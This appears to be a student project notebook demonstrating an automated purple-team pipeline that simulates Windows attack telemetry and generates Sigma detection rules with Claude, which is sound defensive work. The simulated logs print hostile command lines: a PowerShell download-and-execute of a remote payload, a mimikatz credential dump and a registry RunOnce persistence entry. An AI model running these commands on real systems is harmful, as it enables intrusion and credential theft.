# LLM-Driven Purple Team Automation Framework
## Pipeline Demo Notebook

**Author:** Kushagra Patel | Roll No. 2201302012  
**Institution:** Quantum University Roorkee  
**Purpose:** End-to-end demonstration of the Red → Blue → Validate pipeline

---

This notebook walks through a complete pipeline run for all three supported MITRE ATT&CK techniques.  
It shows real output at each stage — telemetry logs, generated Sigma rules, and coverage scores.

> **Note:** Blue Engine cells require a valid `ANTHROPIC_API_KEY` in your `.env` file.  
> Red Engine and Validator cells work without any API key.


## 1. Environment Setup

In [1]:
import sys, os
sys.path.insert(0, os.path.abspath(".."))  # go up from notebooks/ to project root

# Load environment variables from .env
from dotenv import load_dotenv
load_dotenv(dotenv_path="../.env")

print("Environment loaded.")
print(f"API Key set: {'Yes' if os.getenv('ANTHROPIC_API_KEY') else 'NO — set it in .env first'}")


Environment loaded.
API Key set: Yes


## 2. Import Framework Components

In [2]:
from app.engines.red_engine   import RedEngine
from app.engines.blue_engine  import BlueEngine
from app.engines.validator    import ValidatorEngine
from app.engines.orchestrator import Orchestrator
from app.schema.schema        import TechniqueID, PipelineRequest
from app.store.artifact_store import ArtifactStore

print("All components imported successfully.")


All components imported successfully.


## 3. Red Engine — Adversary Simulation

The Red Engine simulates Windows telemetry logs for a given MITRE ATT&CK technique.  
No real attack is executed — all output is synthetic but structurally identical to real logs.

We'll run **T1059.001 (PowerShell Execution)** with 5 logs.


In [3]:
red = RedEngine()
red_result = red.run(TechniqueID.POWERSHELL, log_count=5)

print(f"Technique    : {red_result.technique_id}")
print(f"Logs Generated: {red_result.log_count}")
print(f"Run ID       : {red_result.run_id}")
print()

for i, log in enumerate(red_result.logs, 1):
    print(f"--- Log {i} ---")
    print(f"  Event ID     : {log.event_id}")
    print(f"  Hostname     : {log.hostname}")
    print(f"  Username     : {log.username}")
    print(f"  Process      : {log.process_name}")
    print(f"  Command Line : {log.command_line}")
    print(f"  Parent       : {log.parent_process}")
    print()


Technique    : T1059.001
Logs Generated: 5
Run ID       : 3d8a41b8-2a71-4c6b-8763-ed24b9f12dac

--- Log 1 ---
  Event ID     : 4104
  Hostname     : WORKSTATION-01
  Username     : CORP\mwilson
  Process      : powershell.exe
  Command Line : powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
  Parent       : wscript.exe

--- Log 2 ---
  Event ID     : 4104
  Hostname     : WIN10-HR03
  Username     : CORP\SimUser
  Process      : powershell.exe
  Command Line : powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')"
  Parent       : wscript.exe

--- Log 3 ---
  Event ID     : 4104
  Hostname     : LAPTOP-DEV04
  Username     : CORP\mwilson
  Process      : powershell.exe
  Command Line : powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
  Parent       : cmd.exe

--- Log 4 ---
  Event ID     : 4104
  Hostname    

## 4. Red Engine — All Three Techniques

Let's generate 3 logs for each supported MITRE ATT&CK technique and compare the output fields.


In [4]:
for technique in TechniqueID:
    result = red.run(technique, log_count=3)
    log = result.logs[0]
    print(f"{'='*55}")
    print(f"Technique : {technique.value}")
    print(f"Event ID  : {log.event_id}")
    print(f"Source    : {log.log_source}")
    print(f"Process   : {log.process_name}")
    if log.command_line:
        print(f"Command   : {log.command_line[:80]}...")
    if log.registry_key:
        print(f"RegKey    : {log.registry_key}")
    print()


Technique : T1059.001
Event ID  : 4104
Source    : powershell_operational
Process   : powershell.exe
Command   : powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiA...

Technique : T1003.001
Event ID  : 10
Source    : sysmon
Process   : taskmgr.exe
Command   : mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit...

Technique : T1547.001
Event ID  : 13
Source    : sysmon
Process   : reg.exe
Command   : reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater" /v payl...
RegKey    : HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater



## 5. Blue Engine — Sigma Rule Generation via Claude API

The Blue Engine takes the telemetry logs from Stage 1 and sends them to Claude.  
Claude acts as a detection engineer and returns a valid Sigma YAML rule.

This cell makes a real API call. Requires `ANTHROPIC_API_KEY` in `.env`.


In [5]:
blue = BlueEngine()

# Use the PowerShell logs we already generated
blue_result = blue.run(
    technique_id=red_result.technique_id,
    logs=red_result.logs
)

print(f"Rule Title      : {blue_result.sigma_rule.title}")
print(f"Technique       : {blue_result.sigma_rule.technique_id}")
print(f"Status          : {blue_result.sigma_rule.status}")
print(f"Level           : {blue_result.sigma_rule.level}")
print(f"Prompt Tokens   : {blue_result.prompt_tokens}")
print(f"Response Tokens : {blue_result.completion_tokens}")
print()
print("=" * 55)
print("Generated Sigma Rule (YAML):")
print("=" * 55)
print(blue_result.sigma_rule.raw_yaml)


Rule Title      : Suspicious PowerShell Execution with Obfuscation Techniques
Technique       : T1059.001
Status          : experimental
Level           : high
Prompt Tokens   : 590
Response Tokens : 334

Generated Sigma Rule (YAML):
title: Suspicious PowerShell Execution with Obfuscation Techniques
id: a8b2c3d4-e5f6-7890-1234-567890abcdef
description: Detects PowerShell execution with suspicious parameters indicating potential malicious activity including encoded commands, execution policy bypass, and remote script downloads
status: experimental
level: high
logsource:
  category: process_creation
  product: windows
detection:
  selection1:
    EventID: 4104
    ProcessName: powershell.exe
    CommandLine|contains:
      - '-EncodedCommand'
      - '-WindowStyle Hidden'
  selection2:
    EventID: 4104
    ProcessName: powershell.exe
    CommandLine|contains:
      - '-ExecutionPolicy Bypass'
      - 'IEX'
      - 'New-Object Net.WebClient'
      - 'DownloadString'
  selection3:
    Eve

## 6. Validator Engine — Coverage Scoring

The Validator checks how many of the simulated telemetry logs would have been  
detected by the Sigma rule Claude generated. It matches keywords from the rule's  
`detection` block against the specific fields that Sigma rules target in a real SIEM.

Coverage Score mapping:
- **PASS** → ≥ 75% logs detected  
- **WARN** → 50–74% detected  
- **FAIL** → < 50% detected


In [6]:
validator = ValidatorEngine()

val_result = validator.run(
    technique_id=red_result.technique_id,
    logs=red_result.logs,
    sigma_rule=blue_result.sigma_rule,
)

print(f"Coverage Score : {val_result.coverage_score * 100:.1f}%")
print(f"Matched Logs   : {val_result.matched_logs} / {val_result.total_logs}")
print(f"Status         : {val_result.status}")
print()
print("--- Per-Log Breakdown ---")
for d in val_result.details:
    icon = "DETECTED" if d.matched else "MISSED  "
    print(f"  [{icon}] {d.log_id[:8]}... — {d.match_reason}")


Coverage Score : 100.0%
Matched Logs   : 5 / 5
Status         : PASS

--- Per-Log Breakdown ---
  [DETECTED] da9b879f... — Matched '-windowstyle hidden' in command_line
  [DETECTED] 505a33b7... — Matched 'iex' in command_line
  [DETECTED] f936625e... — Matched '-encodedcommand' in command_line
  [DETECTED] a4b93c91... — Matched 'iex' in command_line
  [DETECTED] baaca95b... — Matched '-encodedcommand' in command_line


## 7. Full Orchestrated Pipeline — Single API Call

The Orchestrator runs all three stages in sequence.  
This is what the FastAPI `/pipeline/run` endpoint calls internally.


In [7]:
orchestrator = Orchestrator()

request = PipelineRequest(
    technique_id=TechniqueID.LSASS_DUMP,
    log_count=5,
    save_artifacts=False,  # set True to save to disk
)

result = orchestrator.run(request)

print(f"Pipeline ID     : {result.pipeline_id}")
print(f"Technique       : {result.technique_id}")
print(f"Logs Generated  : {result.red_result.log_count}")
print(f"Rule Title      : {result.blue_result.sigma_rule.title}")
print(f"Coverage Score  : {result.validator_result.coverage_score * 100:.1f}%")
print(f"Overall Status  : {result.overall_status}")



[Orchestrator] Starting pipeline for T1003.001
[Orchestrator] Log count: 5
[Stage 1/3] Red Engine — Simulating T1003.001...
[Stage 1/3] ✅ Done — 5 logs generated (0.00s)
[Stage 2/3] Blue Engine — Calling Claude API...
[Stage 2/3] ✅ Done — Rule: 'LSASS Memory Dump via Task Manager and ProcDump' (5.04s)
[Stage 3/3] Validator — Scoring detection coverage...
[Stage 3/3] ✅ Done — Coverage: 80.0% [PASS] (0.00s)

[Orchestrator] Pipeline complete!
[Orchestrator] Pipeline ID : 15e3767f-f594-4f51-bd43-676c07a2aaa4
[Orchestrator] Status      : PASS
Pipeline ID     : 15e3767f-f594-4f51-bd43-676c07a2aaa4
Technique       : T1003.001
Logs Generated  : 5
Rule Title      : LSASS Memory Dump via Task Manager and ProcDump
Coverage Score  : 80.0%
Overall Status  : PASS


## 8. Full Pipeline — All Three Techniques

Run the complete Red → Blue → Validate pipeline for each supported technique  
and compare results in a summary table.


In [8]:
results = []

for technique in TechniqueID:
    req = PipelineRequest(
        technique_id=technique,
        log_count=5,
        save_artifacts=False,
    )
    r = orchestrator.run(req)
    results.append({
        "Technique"     : r.technique_id,
        "Rule Title"    : r.blue_result.sigma_rule.title,
        "Coverage"      : f"{r.validator_result.coverage_score * 100:.1f}%",
        "Status"        : r.overall_status,
        "Prompt Tokens" : r.blue_result.prompt_tokens,
    })

# Print as a formatted table
print(f"{'Technique':<15} {'Coverage':<12} {'Status':<8} {'Rule Title'}")
print("-" * 80)
for row in results:
    print(f"{row['Technique']:<15} {row['Coverage']:<12} {row['Status']:<8} {row['Rule Title']}")



[Orchestrator] Starting pipeline for T1059.001
[Orchestrator] Log count: 5
[Stage 1/3] Red Engine — Simulating T1059.001...
[Stage 1/3] ✅ Done — 5 logs generated (0.00s)
[Stage 2/3] Blue Engine — Calling Claude API...
[Stage 2/3] ✅ Done — Rule: 'PowerShell Command Line Execution with Suspicious Parameters' (5.56s)
[Stage 3/3] Validator — Scoring detection coverage...
[Stage 3/3] ✅ Done — Coverage: 100.0% [PASS] (0.00s)

[Orchestrator] Pipeline complete!
[Orchestrator] Pipeline ID : 587fbe24-a8b7-4f84-b801-861aa4c9c793
[Orchestrator] Status      : PASS

[Orchestrator] Starting pipeline for T1003.001
[Orchestrator] Log count: 5
[Stage 1/3] Red Engine — Simulating T1003.001...
[Stage 1/3] ✅ Done — 5 logs generated (0.00s)
[Stage 2/3] Blue Engine — Calling Claude API...
[Stage 2/3] ✅ Done — Rule: 'LSASS Memory Dumping via Process Tools' (6.35s)
[Stage 3/3] Validator — Scoring detection coverage...
[Stage 3/3] ✅ Done — Coverage: 100.0% [PASS] (0.00s)

[Orchestrator] Pipeline complete!
[Orc

## 9. Saving Artifacts to Disk

When `save_artifacts=True`, the pipeline saves:
- Full JSON result → `logs/`
- Generated Sigma YAML → `rules_output/`


In [9]:
# Run pipeline with artifact saving enabled
request_save = PipelineRequest(
    technique_id=TechniqueID.REGISTRY_PERSIST,
    log_count=3,
    save_artifacts=True,
)

result_saved = orchestrator.run(request_save)

store = ArtifactStore()
paths = store.save(result_saved)

print("Artifacts saved:")
for key, path in paths.items():
    print(f"  {key:<15} → {path}")



[Orchestrator] Starting pipeline for T1547.001
[Orchestrator] Log count: 3
[Stage 1/3] Red Engine — Simulating T1547.001...
[Stage 1/3] ✅ Done — 3 logs generated (0.00s)
[Stage 2/3] Blue Engine — Calling Claude API...
[Stage 2/3] ✅ Done — Rule: 'Registry Run Keys Persistence via Command Line Tools' (6.37s)
[Stage 3/3] Validator — Scoring detection coverage...
[Stage 3/3] ✅ Done — Coverage: 100.0% [PASS] (0.00s)

[Orchestrator] Pipeline complete!
[Orchestrator] Pipeline ID : b36cda99-82e5-4d2e-9a55-e8ba8c4a0d78
[Orchestrator] Status      : PASS
[ArtifactStore] 💾 Pipeline JSON saved → C:\Users\Kushagra\OneDrive\Desktop\Purple_Team_Framework\logs\T1547_001_20260309_182051_b36cda99.json
[ArtifactStore] 📄 Sigma Rule YAML saved → C:\Users\Kushagra\OneDrive\Desktop\Purple_Team_Framework\rules_output\T1547_001_20260309_182051_b36cda99.yml
Artifacts saved:
  json            → C:\Users\Kushagra\OneDrive\Desktop\Purple_Team_Framework\logs\T1547_001_20260309_182051_b36cda99.json
  sigma_rule     

## 10. Viewing Saved Pipeline Runs

List all previously saved pipeline runs from the `logs/` directory.


In [10]:
store = ArtifactStore()
runs = store.list_runs()

print(f"Total saved runs: {len(runs)}")
print()

for run in runs:
    status_label = run['overall_status']
    score = run['coverage_score'] * 100
    print(f"  [{status_label}] {run['technique_id']:<12} "
          f"Coverage: {score:.1f}%  "
          f"ID: {run['pipeline_id'][:8]}...  "
          f"At: {run['completed_at'][:19]}")


Total saved runs: 5

  [PASS] T1547.001    Coverage: 100.0%  ID: b36cda99...  At: 2026-03-09T18:20:51
  [PASS] T1059.001    Coverage: 100.0%  ID: 61c79fbc...  At: 2026-03-02T09:51:46
  [PASS] T1059.001    Coverage: 100.0%  ID: a8548e4a...  At: 2026-03-02T09:19:53
  [PASS] T1059.001    Coverage: 100.0%  ID: 9d811a44...  At: 2026-03-02T08:53:12
  [PASS] T1059.001    Coverage: 100.0%  ID: 2673ea4a...  At: 2026-03-02T08:47:16


## Summary

This notebook demonstrated the complete LLM-Driven Purple Team Automation Framework:

| Stage | Component | What it does |
|---|---|---|
| 1 | Red Engine | Simulates realistic Windows attack telemetry |
| 2 | Blue Engine | Uses Claude API to generate a Sigma detection rule |
| 3 | Validator | Scores the rule's coverage against the logs |
| 4 | Orchestrator | Chains all three stages in a single pipeline call |
| 5 | Artifact Store | Persists results as JSON and Sigma YAML |

**Key result:** The framework reduces a manual Purple Team cycle that normally takes hours  
to a fully automated pipeline that completes in under 30 seconds per technique.

---
*Quantum University Roorkee — B.Tech Cybersecurity Final Year Project 2025–26*
